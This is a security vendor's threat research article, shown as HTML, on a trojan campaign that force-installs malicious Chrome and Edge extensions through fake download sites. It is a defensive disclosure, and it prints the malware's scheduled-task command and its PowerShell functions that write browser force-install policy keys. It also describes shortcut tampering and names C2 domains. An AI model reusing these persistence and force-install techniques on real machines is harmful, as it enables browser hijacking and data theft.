<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><meta property="og:type" content="website"/><meta property="og:image" itemProp="image" content="https://reasonlabs.com/images/share-cards/reasonlabs.png"/><meta property="og:image:type" content="image/png"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="600"/><meta name="twitter:card" content="summary_large_image"/><meta property="twitter:domain" content="reasonlabs.com"/><meta property="twitter:url" content="https://reasonlabs.com/"/><meta name="twitter:title" content="ReasonLabs - Enterprise grade security to all of your personal devices"/><meta name="twitter:description" content="Malwares make no distinction between corporate and personal devices. Therefore, past perceptions of different levels of antivirus for businesses and households must be challenged. ReasonLabs is the first endpoint protection based on a multilayered machine-learning engine, that provides enterprise-grade security for all your personal devices."/><title>Extension Trojan Malware Campaign | ReasonLabs</title><meta name="description" content="This research article intends to highlight a specific ongoing threat and the larger issue: malicious web extensions. The ReasonLabs Research Team has identified a new widespread polymorphic malware campaign that forcefully installs extensions on endpoints."/><link rel="canonical" href="https://reasonlabs.com/research/new-widespread-extension-trojan-malware-campaign"/><meta name="next-head-count" content="15"/><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"/><link rel="manifest" href="/site.webmanifest"/><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"/><meta name="msapplication-TileColor" content="#da532c"/><meta name="theme-color" content="#ffffff"/><script id="google-tag-manager" data-nscript="beforeInteractive">
						(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
						new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
						j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
						'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
						})(window,document,'script','dataLayer','GTM-W7FS2KL');
					</script><script id="google-tag-manager" data-nscript="beforeInteractive">
						function OptanonWrapper() { }
					</script><link rel="preload" href="/_next/static/css/374b594e24b53fb4.css" as="style"/><link rel="stylesheet" href="/_next/static/css/374b594e24b53fb4.css" data-n-g=""/><link rel="preload" href="/_next/static/css/0ec662aeefa47c32.css" as="style"/><link rel="stylesheet" href="/_next/static/css/0ec662aeefa47c32.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="https://cookie-cdn.cookiepro.com/scripttemplates/otSDKStub.js" type="text/javascript" charSet="UTF-8" data-domain-script="176c39c5-cc91-4e42-aea9-437007289df9" defer="" data-nscript="beforeInteractive"></script><script src="https://static-cf.cleverbridge.com/mycontent/1/cbFrameCheckout-client-v1.05.js" defer="" data-nscript="beforeInteractive"></script><script src="/_next/static/chunks/webpack-ff47074ca34896e3.js" defer=""></script><script src="/_next/static/chunks/framework-f44ba79936f400b5.js" defer=""></script><script src="/_next/static/chunks/main-791193bf2bdf4623.js" defer=""></script><script src="/_next/static/chunks/pages/_app-5a4bbb04a43b28ef.js" defer=""></script><script src="/_next/static/chunks/1852-bf14fe5709c35c21.js" defer=""></script><script src="/_next/static/chunks/1994-275777823aebbdef.js" defer=""></script><script src="/_next/static/chunks/pages/research/new-widespread-extension-trojan-malware-campaign-ca5aebcd917be284.js" defer=""></script><script src="/_next/static/RMNDSA0HHKUp7oF5aoC_H/_buildManifest.js" defer=""></script><script src="/_next/static/RMNDSA0HHKUp7oF5aoC_H/_ssgManifest.js" defer=""></script></head><body><div id="react-modals"></div><div id="__next" data-reactroot=""><div><div class="grid old-layout"><nav id="app-menu" class="Menu_Menu-StickyWrapper__r87Ob Menu_Menu-StickyWrapper_headerVisible__QR_iE" style="top:0"><div id="app-header" class="Header_Header__1bDpK Header_HideMobile__OJocm"><div class="Header_Header-Wrapper__x24Ke"><div class="Header_Header-Phone__F7Nzj"></div><div class="Header_Header-Menu__8alfu"><span class="Header_Header-Item__4DBej"><a href="/contact-us">Contact Us</a></span><span class="Header_Header-Item__4DBej"><a href="/blog">Blog</a></span></div></div></div><div class="Menu_Menu-Wrapper___SaAE"><div class="Menu_Menu__I56op"><div class="Menu_Menu-MobileBar__44wgk"></div><div class="Menu_Menu-Logo__Qpe2L"><a href="/"><span style="box-sizing:border-box;display:block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;padding-top:17.647058823529413%"></span><img alt="logo" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="responsive" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="logo" sizes="100vw" srcSet="/_next/static/media/logo-reason-labs.884f8136.svg 320w, /_next/static/media/logo-reason-labs.884f8136.svg 576w, /_next/static/media/logo-reason-labs.884f8136.svg 768w, /_next/static/media/logo-reason-labs.884f8136.svg 992w, /_next/static/media/logo-reason-labs.884f8136.svg 1200w, /_next/static/media/logo-reason-labs.884f8136.svg 1400w" src="/_next/static/media/logo-reason-labs.884f8136.svg" decoding="async" data-nimg="responsive" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></a></div><ul class="Menu_Menu-Items__y6pte"><li class="Menu_Menu-Item__pFDul Menu_Menu-Item_noSection__qWbiH">Pricing</li><li class="Menu_Menu-Item__pFDul">Resources</li><li class="Menu_Menu-Item__pFDul"><a href="/company">Company</a></li><li class="Menu_Menu-Item__pFDul">Threat Intelligence</li></ul><div class="styles_buyWrapper___Dl6v undefined" data-disclaimer="false"><button data-atom-asset-name="start_free_trial" data-atom-type="scroll" data-atom-utm-medium="top_bar_buy_now_button" type="button" class="Button_ButtonDefault__FgaZU Button_ButtonDefault_buy__M8qxl Button_ButtonDefault_size_l__HAvyE Menu_Menu-BuyBtn__c4_o_">Start Free Trial</button><div class="styles_moneyBack__5P_aw"><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2721%27%20height=%2721%27/%3e"/></span><img alt="checked" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="checked" srcSet="/_next/static/media/checked-buttom.f643f86e.svg 1x, /_next/static/media/checked-buttom.f643f86e.svg 2x" src="/_next/static/media/checked-buttom.f643f86e.svg" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span><strong>30-day money-back guarantee</strong></div></div><button type="button" class="Menu_Menu-MobileBtn__x_K7A"><span></span></button></div></div></nav><div class="styles_wrapper__qxlpx"><main class="styles_Article__Me8hJ"><div class="sidebar_wrapper__z3jSY"><div class="sidebar_Sidebar__qXpCj"><div class="sidebar_Sidebar-Inner__H96Ns"></div></div></div><article class="styles_Article-Container__lqeNP"><h1 id="title" class="h2 h2_bold">New Widespread Extension Trojan Malware Campaign</h1><p>August 6, 2024<br/>By ReasonLabs Research Team</p><figure><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27966%27%20height=%27544%27/%3e"/></span><img alt="banner" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="banner" srcSet="/_next/static/media/banner.ee0b4b42.svg 1x, /_next/static/media/banner.ee0b4b42.svg 2x" src="/_next/static/media/banner.ee0b4b42.svg" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></figure><h2 id="summary" class="h3 h3_bold">Executive Summary</h2><p>Web browser extensions have grown from being just a niche piece of software into a full-on sub-economy of the Internet industry. Extensions are supported on most browsers, including Microsoft Edge and Google Chrome - both offer hundreds of thousands of extensions in the<!-- --> <a href="https://chromewebstore.google.com/" target="_blank" rel="noreferrer">Chrome Web Store</a> <!-- -->and<!-- --> <a href="https://microsoftedge.microsoft.com/addons/Microsoft-Edge-Extensions-Home" target="_blank" rel="noreferrer">Microsoft Edge Add-ons</a>. With the rise in the popularity of extensions has come a rise in malicious extensions built by bad actors who have pinpointed this relatively new malware attack vector. This research article intends to highlight a specific ongoing threat and the larger issue: malicious web extensions.</p><p>The ReasonLabs Research Team has identified a new widespread polymorphic<!-- --> <a href="https://cyberpedia.reasonlabs.com/EN/malware.html" target="_blank" rel="noreferrer">malware</a>campaign that forcefully installs extensions on endpoints. The<!-- --> <a href="https://cyberpedia.reasonlabs.com/EN/trojan.html" target="_blank" rel="noreferrer">trojan</a> <!-- -->malware contains different deliverables ranging from simple<!-- --> <a href="https://cyberpedia.reasonlabs.com/EN/adware.html" target="_blank" rel="noreferrer">adware</a> <!-- -->extensions that hijack searches to more sophisticated malicious scripts that deliver local extensions to steal private data and execute various commands. This trojan malware, existing since 2021, originates from imitations of download websites with add-ons to online games and videos. We have witnessed a very wide distribution of the malware and extensions - in total at least 300,000 users across Google Chrome and Microsoft Edge have been affected.</p><p>At the time of writing, most AV engines do not detect the installer and the extensions. Countless users across the web are complaining about an extension that they cannot get rid of, even posting complaints on the extension page on the Chrome or Edge store - stating that it is a virus that they cannot get rid of, they don’t know how it appeared, and it keeps returning after attempts to remove it.</p><p>We alerted Google and Microsoft as soon as we became aware of the issue and they are taking the appropriate measures.</p><h2 id="maf" class="h3 h3_bold">Malware Attack Flow</h2><p>Advertisers implemented imitations of download sites like Roblox FPS Unlocker, YouTube, VLC, or KeePass to deliver<!-- --> <a href="https://cyberpedia.reasonlabs.com/EN/trojan.html" target="_blank" rel="noreferrer">trojans</a> <!-- -->that install malicious extensions. The executables downloaded from the fake websites do not even attempt to install the program the user wanted. In some newer versions, we’ve witnessed installations that pull the original program from a Google storage link, using API to download it. (For a list of fake sites and their installers, visit the “IOCs” section).</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27368%27%20height=%27248%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg1.5339c4d3.png&amp;w=384&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg1.5339c4d3.png&amp;w=768&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg1.5339c4d3.png&amp;w=768&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27368%27%20height=%27248%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg2.b3322426.png&amp;w=384&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg2.b3322426.png&amp;w=768&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg2.b3322426.png&amp;w=768&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Once a user downloads the program from the lookalike website, the program registers a scheduled task using a pseudonym that follows the pattern of a PowerShell script file name, like Updater_PrivacyBlocker_PR1, MicrosoftWindowsOptimizerUpdateTask_PR1, and NvOptimizerTaskUpdater_V2. It’s configured to run a<!-- --> <a href="https://cyberpedia.reasonlabs.com/EN/powershell.html" target="_blank" rel="noreferrer">PowerShell</a> <!-- -->script with a similar-looking name “-File C:/Windows/System32/NvWinSearchOptimizer.ps1”. The PowerShell script downloads a payload from a remote server and executes it on the machine. It is important to note that the PowerShell script is written to the system32 folder.</p><p>The task:</p><pre class="styles_Article-Code__V7O9i">C:\Windows\system32\cmd.exe /d /s /c “SCHTASKS /Create /TN
“NvOptimizerTaskUpdater_V2” /SC HOURLY /TR “powershell -File
C:/Windows/System32/NvWinSearchOptimizer.ps1” /RL HIGHEST /MO 4 /RU System /ST
07:27”</pre><p>The script is very short and invokes a second stage script from the<!-- --> <a href="https://cyberpedia.reasonlabs.com/EN/c2.html" target="_blank" rel="noreferrer">C2</a> <!-- -->directly to memory:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27137%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg3.2a97d856.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg3.2a97d856.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg3.2a97d856.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>The installer is signed by Tommy Tech LTD. Other installers signed by the same signer have been around since 2021. During the executions, a folder is created at “c:\windows\NvOptimizerLog” where the rest of the files are dropped. The folder’s name varies from time to time, based on the campaign.</p><p>Most stages of the installation, as well as all related domains, are not detected as malicious:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27131%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg4.ed8b4bd0.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg4.ed8b4bd0.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg4.ed8b4bd0.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27124%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg5.ea558bc1.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg5.ea558bc1.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg5.ea558bc1.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27538%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg6.1dce76b2.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg6.1dce76b2.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg6.1dce76b2.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>The important part of the execution begins when the PowerShell script is finally executed. The script has four interesting functions:</p><p><ol><li>Adds registry values to force the installation of extensions from the store (HKLM:<br/>\SOFTWARE\Policies\Google\Chrome\<b>ExtensionInstallForcelist</b>, HKLM:<br/>\SOFTWARE\Policies\Microsoft\Edge\<b>ExtensionInstallForcelist</b>):<ul><li>The extension steals search queries and redirects them through the adversary’s search.</li><li>The extension cannot be disabled by the user, even with Developer Mode ‘ON’.</li><li>This method results in a message on the browser: “Your browser is managed by your organization”.</li></ul></li><li>Newer versions of the script remove browser updates.</li><li>Tampers with browser “.lnk” files to load a local extension that it drops ($shortcut.Arguments = “<b>$CArgs --load-extension</b>=$CLocalPath”): The local extension again focuses on stealing search queries, but it can also communicate with the C2. It goes through great efforts to obfuscate and hide its activity. It cannot be seen on the “Extensions” management page, so an unsuspecting user cannot easily detect the extension’s existence.</li><li>Communicate with CnC to report on the status and get the next stages to execute: This function downloads and executes with invoke-expression. This script in our case is tampering with <b>chrome/edge browser DLL</b> (i.e. msedge.dll), and overrides bytes in the file that specifies the browser’s search engine.</li></ol></p><p>At the time of writing, almost no one has recognized the relatively new C2 domain as malicious. This is the domain the PowerShell script contacts to download the second stage of the PowerShell script that then modifies the browser’s assets.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27128%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg7.b762a76d.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg7.b762a76d.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg7.b762a76d.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>We have also found more variations of the PowerShell script that contact the domain “nvoptimizer[.]com”, which was created one year ago, as opposed to “nvoptimize[.]com”, created six months ago.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27108%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg8.c5a60923.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg8.c5a60923.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg8.c5a60923.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><h2 id="psdd" class="h3 h3_bold">PowerShell Script Deep Dive</h2><p>The scripts reach the C2 to access:</p><ol><li>A Chrome and Edge extension malware that hijacks search (the extension ID varies).</li><li>A local extension that downloads all of the files from the C2. It saves the files at a path that it also gets as a parameter from the C2. (“C:\\Windows\\InternalKernelGrid” in this case)</li></ol><p>It then replaces all of the browser’s “.lnk” files and edits the target path to execute with additional parameters: “--load-extension” and more parameters that it gets from the C2: the base URL and “--disable-features=OutdatedBuildDetector”.</p><p>The functions of the script are as follows:<ul><li>addRegKeys</li><li>addRegVal</li><li>removeUpdates</li><li>Main</li></ul></p><h3 id="addRegKeys" class="subtitle1 subtitle1_bold">addRegKeys</h3><p>addRegKeys are used to add essential extension registry paths to the registry under HKLM\SOFTWARE\Policies. The malware makes sure the “ExtensionInstallForceList” exists for both Chrome and Edge. They are later used in the script like this:</p><pre class="styles_Article-Code__V7O9i">$keysArr = @(&quot;Google&quot;, &quot;Chrome&quot;, &quot;ExtensionInstallForcelist&quot;);
addRegKeys($keysArr);
$keysArr = @(&quot;Microsoft&quot;, &quot;Edge&quot;, &quot;ExtensionInstallForcelist&quot;);
addRegKeys($keysArr);

function addRegKeys(){
     param ($arr)
     $basePath = &quot;HKLM:\SOFTWARE\Policies\&quot;;
     foreach ($element in $arr) {
        $basePath += $element + &#x27;\&#x27;;

        $t = Test-Path -Path $basePath;
        if (-Not $t){
            $basePath;
            New-Item -Path $basePath;</pre><h3 id="addRegVal" class="subtitle1 subtitle1_bold">addRegVal</h3><p>addRegVal receives parameters information from Stage 3 of the malware after it contacts its C2 for further installation instructions. Inside the response from the C2 are many variables. This function receives instructions on which extensions to force install (based on the response from the C2) and the registry path of the force installation key.</p><pre class="styles_Article-Code__V7O9i">function addRegVal()
{
    param ( $items,[string]$path);
    $currentItems = Get-ItemProperty -Path $path;
    foreach ($a in $items)
    {
        $i = $a.id;
        $val = $a.val;
        if ($currentItems.$i)
        {
            $currentVal = $currentItems.$i;
            if ($currentVal -ne $val)
            {
                Set-ItemProperty -Path $path -Name $i -Value $val;
            }
        }
        else
        {
            New-ItemProperty -Path $path -Name $i -PropertyType String -Value $val;
        }}}</pre><p>This is used later in the script like this:</p><pre class="styles_Article-Code__V7O9i">$CPath = &quot;HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist&quot;;
$EPath = &quot;HKLM:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist&quot;;

$CItems = $services.reg.c;
$EItems = $services.reg.e;
if ($CItems)
{
    addRegVal $CItems $CPath;
}
if ($EItems)
{
    addRegVal $EItems $EPath;    
